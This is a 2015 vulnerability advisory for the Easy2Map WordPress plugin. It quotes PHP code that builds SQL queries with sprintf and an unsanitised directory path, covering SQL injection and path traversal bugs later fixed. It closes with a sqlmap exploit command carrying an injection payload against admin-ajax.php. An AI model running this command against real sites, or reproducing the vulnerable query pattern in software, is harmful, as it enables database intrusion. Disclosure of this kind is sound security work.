Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-08
Vendor: Steven Ellis
Vendor Notified: 2015-06-08, fixed in v1.25
Advisory: http://www.vapid.dhs.org/advisory.php?v=131
Description: The easiest tool available for creating custom & great-looking Google Maps. Add multiple pins and customize maps with drag-and-drop simplicity.
Vulnerability:
The following lines in Function.php use sprintf() to format queries being sent to the database, this doesn&#039;t provide proper sanitization of user input or
properly parameterize the query to the database.
 
90         $wpdb->query(sprintf("UPDATE $mapsTable
91         SET PolyLines = &#039;%s&#039;
92         WHERE ID = &#039;%s&#039;;", $PolyLines, $mapID));
 
.
.
.
163             $wpdb->query(sprintf("
164                 UPDATE $mapsTable
165                 SET TemplateID = &#039;%s&#039;,
166                     MapName = &#039;%s&#039;,
167                     Settings = &#039;%s&#039;,
168                     LastInvoked = CURRENT_TIMESTAMP,
169                     CSSValues = &#039;%s&#039;,
170                     CSSValuesList = &#039;%s&#039;,
171                     CSSValuesHeading = &#039;%s&#039;,
172                     MapHTML = &#039;%s&#039;,
173                     IsActive = 1,
174                     ThemeID = &#039;%s&#039;
175                 WHERE ID = %s;",
176                     $Items[&#039;mapTemplateName&#039;],
177                     $Items[&#039;mapName&#039;],
178                     urldecode($Items[&#039;mapSettingsXML&#039;]),
179                     urldecode($Items["mapCSSXML"]),
180                     urldecode($Items["listCSSXML"]),
181                     urldecode($Items["headingCSSXML"]),
182                     urldecode($Items["mapHTML"]),
183                     $Items[&#039;mapThemeName&#039;],
184                     $mapID));
185         } else {
186 
187             //this is a map insert
188             if (!$wpdb->query(sprintf("
189             INSERT INTO $mapsTable(
190                 TemplateID,
191                 MapName,
192                 DefaultPinImage,
193                 Settings,
194                 LastInvoked,
195                 PolyLines,
196                 CSSValues,
197                 CSSValuesList,
198                 CSSValuesHeading,
199                 MapHTML,
200                 IsActive,
201                 ThemeID
202             ) VALUES (&#039;%s&#039;, &#039;%s&#039;, &#039;%s&#039;, &#039;%s&#039;, 
203                     CURRENT_TIMESTAMP, &#039;%s&#039;, &#039;%s&#039;, &#039;%s&#039;, &#039;%s&#039;, &#039;%s&#039;, 0, &#039;%s&#039;);",
204                     $Items[&#039;mapTemplateName&#039;],
205                     $Items[&#039;mapName&#039;], str_replace(&#039;index.php&#039;, &#039;&#039;, easy2map_get_plugin_url(&#039;/index.php&#039;)) .     "images/map_pins/pins/111.png",
206                     urldecode($Items[&#039;mapSettingsXML&#039;]), &#039;&#039;,
207                     urldecode($Items["mapCSSXML"]),
208                     urldecode($Items["listCSSXML"]),
209                     urldecode($Items["headingCSSXML"]),
210                     urldecode($Items["mapHTML"]),
211                     $Items[&#039;mapThemeName&#039;]))) 
.
.
267         $wpdb->query(sprintf("
268             UPDATE $mapsTable
269             SET MapName = &#039;%s&#039;,
270             LastInvoked = CURRENT_TIMESTAMP,
271             IsActive = 1
272             WHERE ID = %s;", $mapName, $mapID));
 
In MapPinImageSave.php, code isn’t sanitized when creating a directory allowing ../ to create files outside of intended directory:
 
4 $imagesDirectory = WP_CONTENT_DIR . "/uploads/easy2map/images/map_pins/uploaded/" . $_GET["map_id"] . "/";
.
.
11 if (is_uploaded_file($_FILES["pinicon"][&#039;tmp_name&#039;])) {
12 
13     if (!file_exists($imagesDirectory)) {
14         mkdir($imagesDirectory);
15     }
 
CVEID: 2015-4614 (SQLi) 2015-4616 (../ bug)
OSVDB:
 
Exploit Code:
 
  • $ sqlmap -u &#039;http://wp.site:80/wp-admin/admin-ajax.php&#039; --data="mapID=11&mapName=&#039;+or+1%3D%3D1%3B&action=e2m_img_save_map_name" --cookie=COOKIE HERE --level=5 --risk=3

